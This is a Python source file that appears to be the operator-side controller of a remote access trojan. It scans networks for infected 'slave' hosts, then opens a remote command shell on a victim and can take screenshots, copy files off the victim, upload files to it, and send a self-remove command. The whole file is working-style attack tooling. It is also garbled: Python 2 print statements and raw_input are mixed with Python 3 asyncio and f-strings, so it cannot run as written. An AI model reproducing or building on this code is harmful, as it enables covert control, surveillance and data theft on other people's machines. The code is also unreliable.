#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import sys
import subprocess
import ipaddress
import time
import platform
import os
# import threading # No longer needed for scanning
import asyncio # Added asyncio

unrealport = 1255

async def async_try_connect(ip, port, timeout=0.5):
	try:
		reader, writer = await asyncio.wait_for(
			asyncio.open_connection(unicode(ip), port),
			timeout=timeout
		)
		print 'Slave found! : {}'.format(ip)
		writer.close()
		await writer.wait_closed()
		return True # Indicate success
	except (asyncio.TimeoutError, socket.error, ConnectionRefusedError, OSError) as e:
		# OSError can happen for "No route to host"
		print unicode(ip), ' Not founded... ({})'.format(type(e).__name__)
		return False # Indicate failure

async def Scan():
	print '1. Scan all\n2. Scan only one'
	c = raw_input('>') # raw_input is blocking, known limitation
	if len(c) == 0: sys.exit(0)
	elif c == '1':
		Slaves = [] # Retained Slaves list, though not populated in this version
		print 'Address: [Ex: 192.168.1.0/24]'
		hostin = raw_input('>') # raw_input is blocking
		if len(hostin) == 0: sys.exit(0)
		try:
			ip_net = ipaddress.ip_network(unicode(hostin))
		except ValueError as e:
			print "Invalid network address: {}".format(e)
			return

		all_hosts = list(ip_net.hosts())
		tasks = []
		for host_ip in all_hosts:
			# Port 1232 was used in the original threaded version for "Scan all"
			tasks.append(asyncio.create_task(async_try_connect(host_ip, 1232)))

		results = await asyncio.gather(*tasks) # return_exceptions=True is default for create_task
		# Optionally, process results if needed, e.g., count found slaves

	elif c == '2':
		Slaves = []
		print 'Host Address:'
		host = raw_input('>') # raw_input is blocking
		if len(host) == 0: sys.exit(0)
		reader, writer = None, None
		try:
			# unrealport (1255) is used for direct connection control
			reader, writer = await asyncio.wait_for(
				asyncio.open_connection(host, unrealport),
				timeout=2.0 # Using a slightly longer timeout for single scan
			)
			Slaves.append(host)
			print "-" * 15
			print '| Slave found! :' +str(Slaves)+'|'
			print '-' * 15
		except (asyncio.TimeoutError, socket.error, ConnectionRefusedError, OSError) as e:
			print 'Host {} not found or not responding ({})'.format(host, type(e).__name__)
		except KeyboardInterrupt:
			print 'You pressed Ctrl+C'
			# No sys.exit(0) here, let it be handled by main loop's KeyboardInterrupt
		finally:
			if writer:
				writer.close()
				await writer.wait_closed()

async def control(host):
	once = True
	reader, writer = None, None # Initialize for finally block
	try:
		reader, writer = await asyncio.wait_for(
			asyncio.open_connection(host, unrealport),
			timeout=5.0 # Timeout for initial connection
		)
		subprocess.call('clear', shell=True) # Blocking, consider alternatives if problematic
		print 'Connected!'
		print '1. Return the Shell\n2. Close Connection\n3. Remove [X]\n4. Exit'

		# Loop for choosing initial action (shell, close, etc.)
		# raw_input is blocking - known limitation
		s_choice = raw_input('>')
		if len(s_choice) == 0: return # Changed from sys.exit(0) to return

		if s_choice == '1': # Enter shell
			PATH = '$'
			UNAME = ''
			while True: # Main command loop
				if once:
					writer.write('uname'.encode())
					await writer.drain()
					d_bytes = await reader.read(1024)
					if not d_bytes:
						print("Connection closed by slave during initial uname.")
						break
					d = d_bytes.decode()
					osn = d.split('?', 4)
					if len(osn) == 5:
						print '| Name: ', osn[0], 'OS:', osn[1]+','+osn[2]+'|'
						print'|'+osn[3]+'|'
						print '|Architeture: '+osn[4]+'|'
						UNAME = osn[0]
					else:
						print "Unexpected uname response:", d
					once = False

				# raw_input is blocking - known limitation
				cmd = raw_input(UNAME+'@'+PATH+'>')
				if len(cmd) == 0:
					print "Can't be empty"
					continue

				writer.write(cmd.encode())
				await writer.drain()

				if cmd[:5] == '.exit': # Client wishes to exit shell on slave
					# Slave should handle 'rexit' and close its side.
					# We wait for slave to close, then break loop.
					# Root.py doesn't send 'rexit', slave does. This command is for slave.
					# If cmd is '.exit', it is sent to slave, slave might close.
					# This logic implies slave's 'rexit' causes it to close connection.
					print("Exiting slave shell mode. Connection may be closed by slave.")
					# No explicit break here, rely on slave closing or next read failing.
					# However, original code called main() which effectively reset state.
					# For asyncio, we should return to main menu or simply end control.
					# Let's assume '.exit' means exit this control session.
					# The slave is expected to close the connection on 'rexit'.
					# We should probably wait for confirmation or connection to drop.
					# For now, just send and break.
					# This command is actually sent to the slave, slave acts on it.
					# If slave side command is 'rexit', it closes.
					# If user types '.exit' here, we send it.
					# The original `main()` call here means we should break this loop.
					break # Exit the shell loop, will lead to finally block.


				if cmd[:5] == 'where' or cmd[:3] == 'cd ' or cmd[:5] == 'uname' or cmd[:6] == 'sysinf' or cmd[:3] == 'rem':
					# These commands expect a direct response
					response_bytes = await reader.read(1024)
					if not response_bytes:
						print("Connection closed by slave.")
						break
					response = response_bytes.decode()
					if cmd[:3] == 'cd ':
						if response.startswith('err+'):
							print response.split('+',1)[1]
						else:
							PATH = response
					else:
						print response

				elif cmd[:7] == 'print()': # Screenshot
					response_bytes = await reader.read(1024) # Expect 'imgok'
					if not response_bytes:
						print("Connection closed by slave.")
						break
					if response_bytes.decode()[:5] == 'imgok':
						writer.write('send'.encode())
						await writer.drain()

						filepath = os.path.join(os.getcwd(), 'screenshot.png')
						try:
							with open(filepath, 'wb') as f:
								while True:
									chunk = await reader.read(4096) # Increased chunk size
									if not chunk: # Check if slave closed connection or end of file
										break
									f.write(chunk)
									# A proper protocol would indicate end of file.
									# Assuming small screenshots for now or slave closes after sending.
									# Let's assume slave closes connection after sending the file.
									# Or, a specific EOF marker or size is needed.
									# For now, if a read returns empty, we assume file done or conn closed.
									# This part is tricky without clear EOF from slave.
									# If slave doesn't close, this loop might hang or misinterpret next command's output.
									# Let's assume for 'print', the slave sends file then closes.
									# The old code had main() after this, suggesting a reset.
									# If slave closes, next `await reader.read` will get empty bytes.
									# Let's refine: assume slave sends data then we wait for next command
									# unless some specific protocol detail is missed.
									# The original Root.py's `l = sock.recv(1024)` then `while(l)` suggests
									# the slave sends data and then might send empty when done.
									# The slave's `print` code for `con.send(l)` then `con.close()`
									# means the slave *does* close the connection after sending the print.
							print 'Received.. check {}'.format(filepath)
							break # Exit shell loop as connection is closed by slave
						except Exception as e:
							print "Error receiving screenshot: {}".format(e)
							break # Error, exit shell loop
					else:
						print "Slave did not send 'imgok' for print."

				elif cmd[:4] == 'copy': # Receive file from slave
					response_bytes = await reader.read(1024) # Expect 'ok'
					if not response_bytes:
						print("Connection closed by slave.")
						break
					if response_bytes.decode()[:2] == 'ok':
						path = raw_input('FILE PATH (on slave - what to copy from slave):') # blocking
						if path == 'exit': break
						spath = raw_input('PATH TO SAVE (on this machine):') # blocking
						if spath == 'exit': break

						writer.write(path.encode()) # Send path of file to copy from slave
						await writer.drain()

						try:
							with open(spath, 'wb') as f:
								while True:
									# Similar to screenshot, slave sends file then closes.
									# Slave's 'copyfile' does: send(l), then f.close(), then time.sleep(1), then con.close()
									chunk = await reader.read(4096) # Increased chunk size
									if not chunk:
										break # Slave closed connection
									f.write(chunk)
							print 'Done receiving file.'
							break # Exit shell loop as connection closed by slave
						except Exception as e:
							print "Error receiving file for copy: {}".format(e)
							break
					else:
						print "Slave did not send 'ok' for copy."

				elif cmd[:3] == 'put': # Send file to slave
					writer.write('sendfile'.encode()) # Tell slave we are sending a file (was sock.send('sendfile'))
					await writer.drain()

					response_bytes = await reader.read(1024) # Expect 'ready'
					if not response_bytes:
						print("Connection closed by slave.")
						break
					if response_bytes.decode().strip()[:6] == 'ready':
						local_path = raw_input('LOCAL FILE PATH (to send from this machine):') # blocking
						if not os.path.exists(local_path):
							print "Local file {} does not exist.".format(local_path)
							# Need to tell slave to abort or send an empty file?
							# Or just break here. Let's send 'cancel' or similar.
							# The original protocol doesn't seem to have a cancel for this.
							# We'll just break, slave might timeout or error.
							# For a robust solution, send a "cancel" message.
							# For now, we write empty to signal end, then close.
							# This is not ideal. The slave is expecting spath then file data.
							# Let's try to make it a bit more robust by at least closing.
							# If local_path doesn't exist, we can't proceed.
							# The safest is to break and the connection will be closed in finally.
							# Slave will be stuck waiting for spath. This needs protocol enhancement.
							# For now, let's try sending an empty spath, see how slave handles it.
							# writer.write('\n'.encode()) # Send empty path
							# await writer.drain()
							# This is risky. Best to break.
							print("Aborting put operation.")
							break # Exits shell loop, connection closes in finally.

						slave_path = raw_input('PATH TO SAVE (on slave machine):') # blocking

						writer.write(slave_path.encode()) # Send slave path first
						await writer.drain()

						try:
							with open(local_path, 'rb') as f:
								while True:
									chunk = f.read(4096) # Increased chunk size & Blocking read
									if not chunk:
										break
									writer.write(chunk)
									await writer.drain()
							print 'File sent successfully.'
							# Slave's 'sendfile' receives data then breaks its inner loop,
							# waiting for next command. It doesn't close connection.
							# Original root code had sock.close() and main() here.
							# This means we should break from this shell and close.
							# Let's send a special signal or just close.
							# For consistency with original, let's break and close.
							await asyncio.sleep(1) # Match original time.sleep(1)
							print("Closing connection after put.")
							break # Exit shell loop
						except Exception as e:
							print "Error sending file for put: {}".format(e)
							break # Error, exit shell loop
					else:
						print "Slave not ready for file transfer."

				else: # Default command execution
					# This is for general commands not handled above.
					# Slave will execute and send output back.
					# Slave does not close connection after this.
					response_bytes = await reader.read(4096) # Read potentially larger output
					if not response_bytes:
						print("Connection closed by slave.")
						break
					print response_bytes.decode()
			# End of while True (shell loop)

		elif s_choice == '2': # Close connection chosen by user
			print 'Closing connection as per user choice.'
			# writer is closed in finally block
			return # Exit control function

		elif s_choice == '3': # Remove slave (rootexit)
			writer.write('rootexit'.encode())
			await writer.drain()
			print 'Sent remove command to slave. Slave should exit.'
			# Slave will sys.exit(0). Connection will be dropped.
			# We should wait for connection to drop or read to fail.
			# For now, assume command sent, then close from our side.
			return # Exit control function, writer closed in finally

		elif s_choice == '4': # Exit command on Root (client-side, tell slave to close conn)
			writer.write('close'.encode()) # Tell slave to close its end
			await writer.drain()
			print 'Sent close command to slave.'
			return # Exit control function

	except (socket.error, ConnectionRefusedError, asyncio.TimeoutError, OSError) as e:
		print "Connection error: {}".format(e)
	except KeyboardInterrupt:
		print "\nCtrl+C pressed during control session."
		# May want to send a 'close' command to slave if writer is available
		if writer and not writer.is_closing():
			try:
				print("Attempting to inform slave of closure...")
				writer.write('close'.encode()) # Tell slave to close
				await writer.drain()
			except Exception as exc:
				print(f"Error sending close to slave on KBI: {exc}")
	except Exception as e:
		print "An unexpected error occurred in control: {}".format(e)
	finally:
		if writer:
			print("Closing connection to slave...")
			writer.close()
			await writer.wait_closed()
			print("Connection closed.")

async def main():
	while True:
		print '1. Connect\n2. Scan for slaves\n3.Exit'
		r = raw_input('>') # raw_input is blocking
		if len(r) == 0: break
		elif r == '1':
			h = raw_input('>') # raw_input is blocking
			if len(h) == 0: break
			await control(h) # Call async control
		elif r == '2':
			await Scan() # Call async Scan
		elif r == '3':
			print("Exiting...")
			sys.exit(0)
		# Add a small sleep to prevent tight loop if raw_input somehow returns immediately
		# Though with raw_input, this is not strictly necessary.
		# await asyncio.sleep(0.01)

if __name__ == '__main__':
	try:
		asyncio.run(main())
	except KeyboardInterrupt:
		print "\nRoot application terminated by user (Ctrl+C)."
	except Exception as e:
		print "Critical error in main: {}".format(e)
